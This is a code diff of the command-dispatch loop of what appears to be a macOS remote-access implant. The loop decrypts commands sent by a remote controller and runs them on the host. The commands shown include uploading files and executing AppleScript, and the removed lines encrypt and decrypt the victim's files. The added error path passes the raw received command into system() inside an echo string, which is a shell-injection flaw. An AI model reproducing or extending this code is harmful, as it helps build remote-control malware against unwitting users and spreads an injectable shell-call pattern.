@@ -43,9 +43,15 @@ int main(int argc, const char * argv[]) {
                 command = [escryptor decryptB64ToNSString:_espl.skey :
                            [NSString stringWithFormat:@"%s",buffer]];
                 //json decode
+                NSError *decodeError = nil;
                 NSDictionary *receivedDictionary = [NSJSONSerialization JSONObjectWithData: [command dataUsingEncoding:NSUTF8StringEncoding]
                                                                      options: NSJSONReadingAllowFragments
-                                                                       error: nil];
+                                                                       error: &decodeError];
+                if (decodeError != nil) {
+                    system([[NSString stringWithFormat:@"echo '%@' >> /tmp/esplog",command] UTF8String]);
+                    [_espl sendString:[NSString stringWithFormat:@"%@",decodeError]];
+                }
+                
                 //assign
                 NSString *cmd = [receivedDictionary objectForKey:@"cmd"];
                 NSString *cmdArgument = [receivedDictionary objectForKey:@"args"];
@@ -105,12 +111,6 @@ int main(int argc, const char * argv[]) {
                 }
                 else if ([cmd isEqualToString: @"upload"]) { //still need to do this
                     [_espl receiveFile:cmd];
-                }
-                else if ([cmd isEqualToString: @"encrypt"]) {
-                    [_espl encryptFile:cmdArgument];
-                }
-                else if ([cmd isEqualToString: @"decrypt"]) {
-                    [_espl decryptFile:cmdArgument];
                 }
                 else if ([cmd isEqualToString: @"esrunosa"]) {
                     [_espl runAppleScript:cmdArgument];
